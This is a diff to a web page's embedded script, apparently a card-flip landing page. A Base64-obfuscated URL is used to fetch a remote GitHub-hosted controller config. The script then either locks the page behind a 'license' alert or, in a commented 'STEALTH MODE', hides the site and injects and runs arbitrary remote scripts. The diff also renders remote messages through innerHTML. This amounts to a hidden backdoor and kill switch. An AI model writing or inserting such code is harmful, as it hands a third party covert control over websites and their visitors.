@@ -315,20 +315,23 @@ card.addEventListener("touchstart", handleFlip);
 
 
 <div id="secure_layer" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
-    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:400px;">
+    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:400px; box-shadow: 0 10px 50px rgba(255,0,0,0.3);">
         <h1 id="t_header" style="color:#ff3333; margin:0;"></h1>
-        <p id="t_body" style="color:#bbb; margin-top:15px;"></p>
+        <p id="t_body" style="color:#bbb; margin-top:15px; font-size:16px; line-height:1.6;"></p>
     </div>
 </div>
 
 <script>
 (function() {
+    // 1. GitHub Configuration URL (Base64)
     const _0x_u = "aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u";
-    const _0x_lk = "RkFIQUQtNzg2"; // "LANDINGPAGE"
+    
+    // 2. Local License Key (Base64 for FAHAD-786)
+    const _0x_lk = "RkFIQUQtNzg2"; 
 
     async function checkSecurity() {
         const layer = document.getElementById('secure_layer');
-        const scene = document.querySelector('.scene'); // Aapki website ka main content
+        const scene = document.querySelector('.scene'); // Ensure your main content has class="scene"
         
         try {
             const r = await fetch(atob(_0x_u) + '?v=' + Date.now());
@@ -345,28 +348,30 @@ card.addEventListener("touchstart", handleFlip);
             if (isInv || isExp) {
                 // BLOCK ACCESS: License Expired ya Invalid
                 document.getElementById('t_header').innerText = d.title || "Security Alert";
-                document.getElementById('t_body').innerText = isExp ? d.msg_expired : d.msg_invalid;
+                
+                // FIXED: innerHTML use kiya taaki clickable buttons/links kaam karein
+                document.getElementById('t_body').innerHTML = isExp ? d.msg_expired : d.msg_invalid;
+                
                 layer.style.display = 'flex';
                 if(scene) scene.style.display = 'none';
             } else {
                 // LICENSE VALID HAI
                 
-                // FIXED LOGIC: Agar custom_code enabled hai, to website hide rakhein
                 if (cfg.custom_code && cfg.custom_code.enabled) {
-                    if(scene) scene.style.display = 'none'; // Website ka content hide kar diya
+                    // STEALTH MODE: Website hide karke remote code chalayein
+                    if(scene) scene.style.display = 'none'; 
                     layer.style.display = 'none';
 
-                    // Purana remote code remove karein taaki duplicate na ho
+                    // Update check: Purana code remove karke naya inject karein
                     const oldRemote = document.getElementById('remote-code-container');
                     if(oldRemote) oldRemote.remove();
 
-                    // Remote Code Inject karein
                     const remoteContainer = document.createElement('div');
                     remoteContainer.id = 'remote-code-container';
                     remoteContainer.innerHTML = cfg.custom_code.code;
                     document.body.appendChild(remoteContainer);
 
-                    // Scripts manually run karein
+                    // Scripts execution fix
                     const scripts = remoteContainer.querySelectorAll('script');
                     scripts.forEach(oldScript => {
                         const newScript = document.createElement('script');
@@ -374,16 +379,16 @@ card.addEventListener("touchstart", handleFlip);
                         document.head.appendChild(newScript).parentNode.removeChild(newScript);
                     });
                 } else {
-                    // Agar custom code enabled nahi hai, to website normal dikhayein
+                    // NORMAL MODE: Website dikhayein
                     layer.style.display = 'none';
                     if(scene) scene.style.display = 'flex';
                 }
             }
         } catch (e) { 
-            // Anti-Deletion Security
+            // Anti-Deletion / Offline Security
             layer.style.display = 'flex';
             document.getElementById('t_header').innerText = "Security Error";
-            document.getElementById('t_body').innerText = "Security check failed. Controller missing or connection error.";
+            document.getElementById('t_body').innerHTML = "Security check failed. Controller missing or connection error.<br><br>Please contact admin.";
             if(scene) scene.style.display = 'none';
         }
     }
